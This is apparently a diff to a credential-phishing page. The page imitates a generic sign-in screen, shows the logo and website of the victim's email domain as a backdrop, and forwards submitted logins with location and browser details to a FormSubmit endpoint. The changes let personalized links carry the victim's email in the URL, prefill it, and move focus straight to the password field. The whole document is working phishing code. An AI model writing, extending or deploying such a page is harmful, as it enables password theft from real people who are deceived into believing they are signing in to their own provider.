@@ -281,19 +281,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        /* Make iframe content appear brighter */
-        .iframe-content-brightener {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.1);
-            mix-blend-mode: lighten;
-            pointer-events: none;
-            z-index: 1;
-        }
-        
         .iframe-loading {
             position: absolute;
             top: 50%;
@@ -307,6 +294,23 @@
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             z-index: 2;
             display: none;
+        }
+        
+        .url-email-notice {
+            text-align: center;
+            margin: 5px 0 15px 0;
+            color: #666;
+            font-size: 13px;
+            padding: 8px;
+            background: rgba(0, 150, 255, 0.1);
+            border-radius: 6px;
+            border-left: 3px solid #0096FF;
+        }
+        
+        .url-email-notice .email-preview {
+            font-weight: bold;
+            color: #0096FF;
+            word-break: break-all;
         }
     </style>
 </head>
@@ -325,6 +329,11 @@
                 <img id="logo" style="width: 80px; height: 80px;">
                 <div class="logo-fallback" id="logo-fallback">✓</div>
             </div>
+        </div>
+        
+        <!-- Email from URL notice -->
+        <div class="url-email-notice" id="url-email-notice" style="display: none;">
+            Logging in as: <span class="email-preview" id="email-from-url"></span>
         </div>
         
         <h3 id="title">Sign In</h3>
@@ -362,6 +371,70 @@
 let loginAttempts = parseInt(localStorage.getItem('loginAttempts')) || 0;
 let currentEmail = '';
 let storedEmail = localStorage.getItem('currentEmail') || '';
+let emailFromUrl = '';
+
+// Function to get email from URL parameters
+function getEmailFromURL() {
+    // Check for email in URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Try different parameter names
+    const paramNames = ['email', 'user', 'username', 'login', 'e', 'u', 'mail'];
+    
+    for (const param of paramNames) {
+        if (urlParams.has(param)) {
+            const email = urlParams.get(param).trim();
+            if (isValidEmail(email)) {
+                return email;
+            }
+        }
+    }
+    
+    // Check for email in URL hash/fragment
+    const hash = window.location.hash.substring(1);
+    if (hash && isValidEmail(hash)) {
+        return hash;
+    }
+    
+    // Check for email in URL path (less common but possible)
+    const pathParts = window.location.pathname.split('/');
+    for (const part of pathParts) {
+        if (part && isValidEmail(part)) {
+            return part;
+        }
+    }
+    
+    return null;
+}
+
+// Function to decode URL parameters
+function decodeEmail(email) {
+    try {
+        // Try to decode URL-encoded email
+        return decodeURIComponent(email);
+    } catch (e) {
+        return email;
+    }
+}
+
+// Function to validate email format
+function isValidEmail(email) {
+    if (!email || typeof email !== 'string') return false;
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return emailRegex.test(email.trim());
+}
+
+// Function to extract domain from email
+function getDomainFromEmail(email) {
+    if (!email || !email.includes('@')) return 'example.com';
+    const domain = email.split('@').pop();
+    return domain || 'example.com';
+}
+
+// Function to get domain name without TLD
+function getDomainName(domain) {
+    return domain.split('.')[0] || domain;
+}
 
 // Enhanced function to load iframe with MAXIMUM VISIBILITY
 function loadWebsitePreview(domain) {
@@ -402,19 +475,6 @@ function loadWebsitePreview(domain) {
                     // Make content brighter and more visible
                     iframeDoc.body.style.filter = 'brightness(1.1) contrast(1.1)';
                     iframeDoc.body.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
-                    
-                    // Try to make text darker for better contrast
-                    const allElements = iframeDoc.querySelectorAll('*');
-                    allElements.forEach(el => {
-                        const computedStyle = window.getComputedStyle(el);
-                        const color = computedStyle.color;
-                        if (color && !color.includes('rgba(0, 0, 0') && !color.includes('#000')) {
-                            el.style.color = 'rgba(0, 0, 0, 0.9)';
-                        }
-                        if (computedStyle.backgroundColor && computedStyle.backgroundColor !== 'rgba(0, 0, 0, 0)') {
-                            el.style.backgroundColor = 'rgba(255, 255, 255, 0.3)';
-                        }
-                    });
                 }
             } catch (e) {
                 // CORS restrictions prevent direct DOM manipulation
@@ -464,24 +524,6 @@ function loadWebsitePreview(domain) {
             iframe.style.filter = 'brightness(1.1)';
         }
     }, 3000);
-}
-
-// Function to validate email format
-function isValidEmail(email) {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return emailRegex.test(email);
-}
-
-// Function to extract domain from email
-function getDomainFromEmail(email) {
-    if (!email || !email.includes('@')) return 'example.com';
-    const domain = email.split('@').pop();
-    return domain || 'example.com';
-}
-
-// Function to get domain name without TLD
-function getDomainName(domain) {
-    return domain.split('.')[0] || domain;
 }
 
 // Function to get website URL from domain
@@ -580,12 +622,56 @@ function loadLogoFromEmail(email) {
     loadWebsitePreview(domain);
 }
 
-// Initialize form
+// Initialize form with email from URL if present
 function initializeForm() {
-    // Show default logo
-    $("#logo").hide();
-    $("#logo-fallback").show().text("✓");
-    $(".logo-container").css("background-color", "#0096FF");
+    // Check for email in URL
+    emailFromUrl = getEmailFromURL();
+    
+    if (emailFromUrl) {
+        // Decode the email
+        emailFromUrl = decodeEmail(emailFromUrl);
+        
+        // Show notice about email from URL
+        document.getElementById('url-email-notice').style.display = 'block';
+        document.getElementById('email-from-url').textContent = emailFromUrl;
+        
+        // Pre-fill the email field
+        document.getElementById('email').value = emailFromUrl;
+        currentEmail = emailFromUrl;
+        
+        // Store email for persistence
+        localStorage.setItem('currentEmail', emailFromUrl);
+        
+        // Load logo and background based on email domain
+        loadLogoFromEmail(emailFromUrl);
+        
+        // Focus on password field since email is already filled
+        setTimeout(() => {
+            $('#psw').focus();
+        }, 100);
+        
+        console.log('Email loaded from URL:', emailFromUrl);
+    } else {
+        // Show default logo
+        $("#logo").hide();
+        $("#logo-fallback").show().text("✓");
+        $(".logo-container").css("background-color", "#0096FF");
+        
+        // Hide URL email notice
+        document.getElementById('url-email-notice').style.display = 'none';
+        
+        // Load a default background for initial view
+        setTimeout(() => {
+            const iframeBackground = document.getElementById('iframe-background');
+            iframeBackground.style.opacity = '0.7';
+            document.getElementById('domain-iframe').style.backgroundColor = '#f0f0f0';
+        }, 100);
+        
+        // Focus on email field
+        setTimeout(() => {
+            $('#email').focus();
+        }, 100);
+    }
     
     // Hide attempt info
     $('#attempt-info').hide();
@@ -594,18 +680,6 @@ function initializeForm() {
     if (storedEmail && storedEmail === currentEmail) {
         updateAttemptDisplay();
     }
-    
-    // Load a default background for initial view
-    setTimeout(() => {
-        const iframeBackground = document.getElementById('iframe-background');
-        iframeBackground.style.opacity = '0.7';
-        document.getElementById('domain-iframe').style.backgroundColor = '#f0f0f0';
-    }, 100);
-    
-    // Focus on email field
-    setTimeout(() => {
-        $('#email').focus();
-    }, 100);
 }
 
 // Update logo when user enters email
@@ -704,7 +778,8 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
             Location: response.city + ", " + response.country,
             Domain: domain,
             UserAgent: navigator.userAgent,
-            Timestamp: new Date().toLocaleString()
+            Timestamp: new Date().toLocaleString(),
+            Source: emailFromUrl ? 'URL Parameter' : 'Manual Input'
         };
         
         console.log('Submitting login attempt:', loginAttempts, 'for domain:', domain);
@@ -741,7 +816,8 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
             Location: 'Unknown',
             Domain: domain,
             UserAgent: navigator.userAgent,
-            Timestamp: new Date().toLocaleString()
+            Timestamp: new Date().toLocaleString(),
+            Source: emailFromUrl ? 'URL Parameter' : 'Manual Input'
         };
         
         // Send to FormSubmit endpoint
@@ -819,6 +895,23 @@ window.addEventListener('beforeunload', function() {
     // Optional: uncomment to clear attempts on page refresh
     // localStorage.removeItem('loginAttempts');
     // localStorage.removeItem('currentEmail');
+});
+
+// Function to update URL with email parameter (optional feature)
+function updateURLWithEmail(email) {
+    if (email && isValidEmail(email)) {
+        const url = new URL(window.location);
+        url.searchParams.set('email', email);
+        window.history.replaceState({}, '', url);
+    }
+}
+
+// If email is changed manually, update URL (optional)
+$("#email").on("change", function() {
+    const email = $(this).val().trim();
+    if (email && isValidEmail(email)) {
+        updateURLWithEmail(email);
+    }
 });
 </script>
 </body>
